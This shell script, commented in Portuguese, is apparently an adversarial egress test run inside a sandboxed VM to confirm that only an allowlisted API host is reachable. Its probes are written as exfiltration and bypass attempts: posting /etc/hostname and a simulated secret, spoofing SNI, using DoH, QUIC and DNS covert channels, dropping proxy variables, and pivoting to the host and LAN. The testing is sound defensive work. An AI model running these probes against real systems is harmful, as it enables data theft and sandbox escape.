#!/bin/sh
# GATE DA FASE 2 — validacao adversarial de egress, rodada DENTRO do guest.
# Implementa research/egress.md §4.4 (itens 1-8) adaptado a arquitetura real do
# shuru, mais 4 sondas que so fazem sentido nela. Chamado por
# scripts/shuru-verify-fase2.sh — nao rode isto no host.
#
# "Itens 1-7 bloqueiam" (docs/plano-adocao-tokens.md). O item 8 do research
# (exfil dentro de dominio permitido) PASSA por construcao e e risco residual
# aceito, nao falha. O item 6 do research e sobre processo do HOST: nao e
# testavel de dentro do guest, e foi respondido do lado de fora — ver o driver.
#
# Regra de ouro: **nunca confundir "nao consegui medir" com "bloqueado"**. Um
# gate que conta erro de ferramenta como vitoria mente exatamente quando voce
# mais depende dele. Dai os DOIS controles obrigatorios antes de qualquer
# afirmacao — o positivo (o permitido funciona) e o negativo (a sonda sabe
# distinguir alcance de aceite local). Sem os dois, o gate aborta.
set -u

PROBE="node /gate/probe.js"
fail=0; residual=0
. /gate/ips.env    # IPs resolvidos no host: o guest nao consegue resolve-los

# Codigo HTTP, ou 000 quando a conexao nem aconteceu.
# (A primeira versao fazia `curl || echo erro`: o curl ja imprime 000 ao
# falhar, entao as duas saidas se concatenavam em "000erro", que nao casava com
# teste nenhum e virava falso-positivo. Tres testes acusaram vazamento assim.)
tentar_http() { curl -s -o /dev/null -w '%{http_code}' -m 10 "$@" 2>/dev/null || true; }

BLOQUEIA() { printf 'BLOQUEIA  %s\n' "$1"; }
INFORMA()  { printf 'INFORMA   %s\n' "$1"; }
ok()   { printf '   ✅ %s\n' "$1"; }
ruim() { printf '   ❌ %s\n' "$1"; fail=$((fail+1)); }
nota() { printf '   ⚠️  %s\n' "$1"; residual=$((residual+1)); }
abortar() { printf '   ⛔ %s\n' "$1"; echo "   RESULTADO: INCONCLUSIVO — nao interprete como aprovacao."; exit 3; }

echo "################ GATE ADVERSARIAL — FASE 2 ################"
echo

# ---------------------------------------------------------------------------
echo "== 0a. CONTROLE POSITIVO — o host permitido tem que funcionar"
# Sem isto o gate e invalido: uma VM sem rede nenhuma "bloqueia" tudo e passaria
# com louvor, provando nada.
r=$($PROBE tls api.anthropic.com 443)
[ "$r" = "CONECTOU" ] && ok "api.anthropic.com:443 alcancavel — o gate mede algo real" \
  || abortar "host PERMITIDO inalcancavel ($r) — a VM esta sem rede."

echo
echo "== 0b. CONTROLE NEGATIVO — a sonda sabe o que e alcance?"
# 192.0.2.1 e TEST-NET-1 (RFC 5737): inalcancavel por definicao. Se a sonda
# disser que recebeu dados dali, ela esta medindo ficcao e nada abaixo vale.
# Este controle existe porque a pilha TCP em modo usuario do shuru aceita o
# handshake localmente: connect() para TEST-NET-1 "tem sucesso". Byte de volta,
# nao, e por isso o criterio e byte de volta.
r=$($PROBE tcp 192.0.2.1 443 http)
case "$r" in
  RECEBEU*) abortar "TEST-NET-1 devolveu dados ($r) — a sonda nao e confiavel." ;;
  *)        ok "192.0.2.1:443 -> $r (aceite local nao e confundido com alcance)" ;;
esac

# ---------------------------------------------------------------------------
echo
echo "== 1. POST a dominio fora da allowlist"
BLOQUEIA "curl https://example.com (por nome)"
c=$(tentar_http -d @/etc/hostname https://example.com/)
[ "$c" = "000" ] && ok "negado (curl=$c)" || ruim "PASSOU com HTTP $c"

# ---------------------------------------------------------------------------
echo
echo "== 2. Socket TCP direto, sem HTTP e sem proxy"
BLOQUEIA "TCP cru para example.com:443 e :80"
# Nao existe HTTP_PROXY para ignorar nesta arquitetura (ver teste 7): este ja E
# o caminho cru que o codigo malicioso usaria.
for p in 443 80; do
  r=$($PROBE tcp "$IP_EXAMPLE" "$p" http)
  case "$r" in
    RECEBEU*) ruim "socket cru trouxe dados de :$p ($r)" ;;
    *)        ok ":$p -> $r" ;;
  esac
done

# ---------------------------------------------------------------------------
echo
echo "== 3. DNS direto a resolver publico"
BLOQUEIA "UDP 53 -> 8.8.8.8 e 1.1.1.1"
for dns in 8.8.8.8 1.1.1.1; do
  r=$($PROBE udp-dns "$dns" 53 example.com)
  case "$r" in
    RESPONDEU*) ruim "$dns respondeu ($r) — resolver externo alcancavel" ;;
    *)          ok "$dns: $r" ;;
  esac
done

# ---------------------------------------------------------------------------
echo
echo "== 4. IP literal, sem DNS nenhum"
BLOQUEIA "curl https://$IP_EXAMPLE/"
# E o teste do IP fixado: se a allowlist fosse so por nome, bastaria pular o
# DNS para contorna-la.
c=$(tentar_http -k "https://$IP_EXAMPLE/")
[ "$c" = "000" ] && ok "negado (curl=$c)" || ruim "PASSOU com HTTP $c"

# ---------------------------------------------------------------------------
echo
echo "== 5. DoH (DNS por HTTPS)"
BLOQUEIA "cloudflare-dns.com, por nome e por IP"
c=$(tentar_http -H 'accept: application/dns-json' \
      'https://cloudflare-dns.com/dns-query?name=example.com&type=A')
[ "$c" = "000" ] && ok "por nome: negado (curl=$c)" || ruim "DoH por nome PASSOU (HTTP $c)"
r=$($PROBE tls "$IP_DOH" 443 cloudflare-dns.com)
[ "$r" = "CONECTOU" ] && ruim "DoH por IP conectou" || ok "por IP: $r"

# ---------------------------------------------------------------------------
echo
echo "== 6. Protocolo nao-HTTP e tunel"
BLOQUEIA "IRC 6667, SSH 22, SMTP 25 — criterio: banner do servidor"
# SSH e SMTP falam primeiro; se houvesse alcance real, o banner chegaria em ms.
r=$($PROBE tcp "$IP_EXAMPLE" 6667 irc); case "$r" in RECEBEU*) ruim "IRC 6667 respondeu ($r)";; *) ok "IRC 6667: $r";; esac
r=$($PROBE tcp "$IP_GITHUB" 22);        case "$r" in RECEBEU*) ruim "SSH 22 mandou banner ($r) — tunel -D viavel";; *) ok "SSH 22: $r";; esac
r=$($PROBE tcp "$IP_EXAMPLE" 25);       case "$r" in RECEBEU*) ruim "SMTP 25 respondeu ($r)";; *) ok "SMTP 25: $r";; esac

# ---------------------------------------------------------------------------
echo
echo "== 7. Bypass por variavel de proxy"
BLOQUEIA "unset HTTP_PROXY seguido de request"
# O achado que torna este teste diferente do research: NAO EXISTE variavel de
# proxy nesta arquitetura. Nao ha cooperacao para retirar — a interceptacao
# acontece abaixo do guest. Ainda assim se mede, porque a ausencia e a prova.
if env | grep -qiE '^(http|https|all|ftp)_proxy='; then
  ruim "existe variavel de proxy — enforcement seria cooperativo:"
  env | grep -iE '^(http|https|all|ftp)_proxy=' | sed 's/^/      /'
else
  ok "nenhuma variavel de proxy existe para ser removida"
fi
unset HTTP_PROXY HTTPS_PROXY ALL_PROXY http_proxy https_proxy all_proxy
c=$(tentar_http https://api.anthropic.com/v1/models)
[ "$c" = "000" ] && ruim "permitido quebrou sem as vars (teste invalido)" \
  || ok "permitido continua saindo (HTTP $c) sem nenhuma var de proxy"

# ---------------------------------------------------------------------------
echo
echo "== 8. Exfiltracao DENTRO de dominio permitido"
INFORMA "PASSAR aqui e o esperado — risco residual documentado, nao falha"
c=$(tentar_http -X POST -d 'segredo-simulado=abc123' https://api.anthropic.com/v1/messages)
case "$c" in
  000) ok "nao saiu (mais restrito que o previsto)" ;;
  *) nota "corpo arbitrario chegou a api.anthropic.com (HTTP $c). Allowlist por
       host nao ve conteudo: e o risco residual §4.5 do research. So MITM
       seletivo mitiga, e o custo e quebrar pinning." ;;
esac

# ---------------------------------------------------------------------------
echo
echo "== 9. SNI permitido apontando para IP proibido"
BLOQUEIA "tls.connect(IP de example.com, servername=api.anthropic.com)"
# Se a decisao fosse tomada SO pelo SNI, isto entregaria qualquer servidor do
# mundo sob um nome permitido — o bypass classico de allowlist por SNI.
r=$($PROBE tls "$IP_EXAMPLE" 443 api.anthropic.com)
[ "$r" = "CONECTOU" ] && ruim "SNI forjado alcancou IP proibido" || ok "$r"

# ---------------------------------------------------------------------------
echo
echo "== 10. QUIC / UDP 443"
BLOQUEIA "UDP 443 para host permitido e proibido"
# Com UDP/443 aberto, HTTP/3 com ECH cifra o SNI e a allowlist por nome vira
# decorativa (research §4.5).
for alvo in "$IP_ANTHROPIC" "$IP_EXAMPLE"; do
  r=$($PROBE udp-quic "$alvo" 443)
  case "$r" in
    RESPONDEU*) ruim "UDP/443 respondeu de $alvo — ECH contornaria a allowlist" ;;
    *)          ok "$alvo: $r" ;;
  esac
done

# ---------------------------------------------------------------------------
echo
echo "== 11. Resolver do proprio shuru (10.0.0.1) como canal"
INFORMA "mede largura de banda de canal encoberto, nao bloqueio"
r=$($PROBE udp-dns 10.0.0.1 53 exfil-teste-nao-permitido.example.com)
case "$r" in
  RESPONDEU:ancount=0) ok "resolve so o que esta na allowlist (ancount=0 para o resto)" ;;
  RESPONDEU*) nota "o resolver responde nomes arbitrarios ($r): canal DNS de
       baixa largura existe. Nao e furo de allowlist HTTP, mas entra em §4.5." ;;
  *) ok "resolver nao responde a nomes fora da lista: $r" ;;
esac

# ---------------------------------------------------------------------------
echo
echo "== 12. Pivot para o host e para a LAN do Mac"
BLOQUEIA "servicos do host e vizinhos da LAN — criterio: byte de volta"
# Pivotar para o host ou para a LAN vale mais para um atacante do que a
# internet: e onde estao o broker, o Keychain e as outras maquinas.
for p in 22 80 5900 8080; do
  case "$p" in 80|8080) pl=http ;; *) pl="" ;; esac
  r=$($PROBE tcp 10.0.0.1 "$p" "$pl")
  case "$r" in RECEBEU*) ruim "10.0.0.1:$p respondeu ($r)";; *) ok "10.0.0.1:$p: $r";; esac
done
r=$($PROBE tcp 192.168.0.1 80 http)
case "$r" in RECEBEU*) ruim "roteador da LAN respondeu ($r)";; *) ok "LAN 192.168.0.1:80: $r";; esac

# ---------------------------------------------------------------------------
echo
echo "##########################################################"
if [ "$fail" -eq 0 ]; then
  echo "RESULTADO: PASSOU — nenhum caminho de egress fora da allowlist."
  [ "$residual" -gt 0 ] && echo "  ($residual risco(s) residual(is) documentado(s) acima — esperados)"
else
  echo "RESULTADO: FALHOU — $fail caminho(s) de egress passou(aram)."
  echo "  O isolamento esta furado. Pare: nada de trabalho real com rede ate"
  echo "  corrigir, ou caia no plano B (Apple container + Squid + pf)."
fi
exit "$fail"
